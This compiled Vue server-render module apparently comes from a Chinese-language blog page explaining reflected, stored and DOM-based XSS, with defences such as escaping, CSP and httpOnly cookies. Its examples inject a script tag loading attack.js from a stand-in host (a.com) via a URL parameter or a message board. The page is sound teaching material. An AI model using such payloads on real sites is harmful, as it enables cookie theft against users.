import { ssrRenderAttrs } from "vue/server-renderer";
import { useSSRContext } from "vue";
import { _ as _export_sfc } from "./plugin-vue_export-helper.cc2b3d55.js";
const __pageData = JSON.parse('{"title":"xss攻击","description":"","frontmatter":{"sidebar":null,"group":null,"title":"xss攻击","isTimeLine":true,"date":"11-10-2023"},"headers":[],"relativePath":"internet/XSS攻击.md","filePath":"internet/XSS攻击.md","lastUpdated":1701327138000}');
const _sfc_main = { name: "internet/XSS攻击.md" };
function _sfc_ssrRender(_ctx, _push, _parent, _attrs, $props, $setup, $data, $options) {
  _push(`<div${ssrRenderAttrs(_attrs)}><h1 id="xss攻击" tabindex="-1">xss攻击 <a class="header-anchor" href="#xss攻击" aria-label="Permalink to &quot;xss攻击&quot;">​</a></h1><h2 id="xss-跨站脚本攻击" tabindex="-1">XSS 跨站脚本攻击 <a class="header-anchor" href="#xss-跨站脚本攻击" aria-label="Permalink to &quot;XSS 跨站脚本攻击&quot;">​</a></h2><p>指攻击者在网页中注入恶意代码，在用户浏览网页的时候进行攻击。</p><p>类型：</p><p>反射型（非持久性）</p><p>原理：将攻击代码放在 url 地址的请求参数中，其他用户访问该恶意链接时，服务端在 URL 取出恶意代码后拼接至 HTML 中返回给用户浏览器。</p><p>要点：</p><p>通过 URL 插入恶意代码。 有服务端参与。 需要用户访问特定链接。 例子：</p><p>攻击者诱导被害者打开链接 hzfe.org?name=<script src="http://a.com/attack.js"><\/script>。</p><p>被攻击网站服务器收到请求后，未经处理直接将 URL 的 name 字段直接拼接至前端模板中，并返回数据。</p><p>被害者在不知情的情况下，执行了攻击者注入的脚本（可以通过这个获取对方的 Cookie 等）。</p><p>存储型（持久性）</p><p>原理：攻击者将注入型脚本提交至被攻击网站数据库中，当其他用户浏览器请求数据时，注入脚本从服务器返回并执行。</p><p>要点：</p><p>恶意代码存储在目标网站服务器上。 有服务端参与。 只要用户访问被注入恶意脚本的页面时，就会被攻击。 例子：</p><p>攻击者在目标网站留言板中提交了 <script src="http://a.com/attack.js"><\/script>。</p><p>目标网站服务端未经转义存储了恶意代码，前端请求到数据后直接通过 innerHTML 渲染到页面中。</p><p>其他用户在访问该留言板时，会自动执行攻击者注入脚本。</p><p>DOM 型</p><p>原理：攻击者通过在 URL 插入恶意代码，客户端脚本取出 URL 中的恶意代码并执行。</p><p>要点：在客户端发生。</p><p>例子：</p><p>攻击者诱导被害者打开链接 hzfe.org?name=<script src="http://a.com/attack.js"><\/script>。</p><p>被攻击网站前端取出 URL 的 name 字段后未经转义直接通过 innerHTML 渲染到页面中。</p><p>被害者在不知情的情况下，执行了攻击者注入的脚本。</p><p>防范 XSS：</p><p>对于外部传入的内容进行充分转义。 开启 CSP（Content Security Policy，内容安全策略），规定客户端哪些外部资源可以加载和执行，降低 XSS 风险。 设置 Cookie httpOnly 属性，禁止 JS 读取 Cookie 防止被窃取。</p><h1 id="" tabindex="-1"><a class="header-anchor" href="#" aria-label="Permalink to &quot;&quot;">​</a></h1></div>`);
}
const _sfc_setup = _sfc_main.setup;
_sfc_main.setup = (props, ctx) => {
  const ssrContext = useSSRContext();
  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("internet/XSS攻击.md");
  return _sfc_setup ? _sfc_setup(props, ctx) : void 0;
};
const XSS__ = /* @__PURE__ */ _export_sfc(_sfc_main, [["ssrRender", _sfc_ssrRender]]);
export {
  __pageData,
  XSS__ as default
};
